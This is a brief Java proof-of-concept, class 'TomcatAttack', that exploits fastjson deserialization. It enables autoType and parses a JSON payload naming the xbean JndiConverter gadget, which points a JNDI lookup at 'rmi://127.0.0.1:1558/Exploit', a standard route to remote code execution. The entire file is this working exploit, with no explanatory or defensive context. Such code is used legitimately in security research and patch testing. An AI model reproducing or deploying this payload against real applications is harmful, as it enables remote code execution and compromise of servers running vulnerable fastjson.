package Demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.xbean.propertyeditor.JndiConverter;

public class TomcatAttack {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        JndiConverter
        String s = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:1558/Exploit\"}";
        JSON.parseObject(s);
    }
}
